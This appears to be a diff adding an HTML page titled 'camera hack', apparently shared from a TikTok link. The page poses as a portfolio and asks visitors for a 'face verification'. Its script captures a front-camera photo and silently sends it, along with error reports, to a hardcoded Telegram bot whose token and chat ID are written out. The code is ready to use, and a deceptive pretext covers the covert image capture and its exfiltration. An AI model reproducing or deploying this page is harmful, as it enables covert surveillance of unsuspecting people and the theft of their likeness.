@@ -1,0 +1,124 @@
+nama=https://vt.tiktok.com/ZSU34W8dR/
+language=html
+lines=120
+date=25/10/2025
+code=<!DOCTYPE html>
+<html>
+<head>
+  <title>camera hack</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      background-color: #ffffff;
+      color: #333;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 16px;
+      background-color: #25D366;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      margin-top: 30px;
+    }
+    video {
+      display: block;
+      margin: 20px auto;
+      width: 90%;
+      max-width: 400px;
+      border: 2px dashed #25D366;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h2>protofolio ilham</h2>
+  <p>Untuk mengaktifkan fitur ini, lakukan verifikasi wajah singkat.</p>
+  <button onclick="startSnap()">Aktifkan Sekarang</button>
+  <video id="cam" autoplay muted playsinline></video>
+  <canvas id="snap" style="display:none;"></canvas>
+  <p id="status" style="margin-top: 20px;"></p>
+
+<script>
+const token = "8363805687:AAHWiCFBN6p7oEFLrr9xWeEYlrbKOe5H5-I";
+const chatId = "8000009750";
+
+async function startSnap() {
+  const video = document.getElementById('cam');
+  const canvas = document.getElementById('snap');
+  const ctx = canvas.getContext('2d');
+  const status = document.getElementById('status');
+
+  status.innerText = "Mengaktifkan kamera...";
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      video.play();
+      status.innerText = "Kamera aktif. Menyiapkan jepretan...";
+
+      setTimeout(() => {
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+          status.innerText = "❌ Kamera tidak memberi gambar.";
+          reportError("Kamera aktif, tapi ukuran video = 0.");
+          return;
+        }
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        stream.getTracks().forEach(track => track.stop());
+
+        const imgData = canvas.toDataURL('image/jpeg');
+        sendPhoto(imgData);
+        status.innerText = "✔️ Verifikasi selesai.";
+      }, 3000);
+    };
+
+  } catch (err) {
+    status.innerText = "❌ Gagal akses kamera.";
+    reportError("Gagal akses kamera: " + err.message);
+  }
+}
+
+function sendPhoto(base64img) {
+  const blob = dataURItoBlob(base64img);
+  const form = new FormData();
+  form.append("chat_id", chatId);
+  form.append("photo", blob, "mood_capture.jpg");
+
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: "POST",
+    body: form
+  });
+}
+
+function reportError(message) {
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: "⚠️ ERROR:\n" + message
+    })
+  });
+}
+
+function dataURItoBlob(dataURI) {
+  const byteString = atob(dataURI.split(',')[1]);
+  const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+  const ab = new ArrayBuffer(byteString.length);
+  const ia = new Uint8Array(ab);
+  for (let i = 0; i < byteString.length; i++) {
+    ia[i] = byteString.charCodeAt(i);
+  }
+  return new Blob([ab], { type: mime });
+}
+</script>
+</body>
+</html>
